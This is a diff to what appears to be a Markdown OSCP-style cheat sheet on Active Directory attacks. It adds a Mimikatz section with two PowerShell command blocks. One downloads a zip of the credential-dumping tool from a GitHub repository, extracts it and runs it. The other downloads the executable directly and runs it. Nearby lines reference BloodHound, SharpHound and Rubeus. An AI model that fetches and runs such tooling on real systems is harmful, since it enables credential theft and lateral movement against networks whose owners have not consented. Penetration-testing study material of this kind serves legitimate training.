@@ -201,9 +201,19 @@ Invoke-BloodHound -CollectionMethod ACL,ObjectProps
 ```
 SharpHound.exe
 ```
-##### MIMIKATZ
+# MIMIKATZ
+## TECHNIQUES
+##### MIMIKATZ - DOWNLOAD E EXECUTE ZIP VIA POWERSHELL
 ```
-aaa
+curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
+expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
+cd x64
+.\mimikatz.exe
+```
+##### MIMIKATZ - DOWNLOAD E EXECUTE EXE VIA POWERSHELL
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
+.\mimikatz.exe
 ```
 ##### RUBEUS
 ```
